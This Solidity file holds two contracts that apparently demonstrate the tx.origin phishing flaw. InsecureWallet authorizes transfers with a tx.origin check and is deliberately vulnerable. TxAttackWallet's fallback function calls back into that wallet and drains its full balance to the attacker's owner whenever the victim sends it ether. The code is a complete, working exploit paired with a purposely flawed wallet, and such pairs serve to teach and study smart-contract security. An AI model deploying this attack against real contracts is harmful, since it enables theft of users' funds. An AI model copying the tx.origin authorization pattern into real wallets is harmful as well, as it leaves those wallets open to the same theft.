pragma solidity 0.4.19;

contract InsecureWallet {
    address public owner;

    function InsecureWallet() public {
        owner = msg.sender;
    }

    function transfer(address dest, uint amount) public {
        if (tx.origin != owner) {
            revert();
        }
        if (!dest.call.value(amount)()) {
            revert();
        }
    }

    function() payable public {
    }
}

contract TxAttackWallet {
    address public owner;

    function TxAttackWallet() public {
        owner = msg.sender;
    }

    function() payable public {
        InsecureWallet(msg.sender).transfer(owner, msg.sender.balance);
    }
}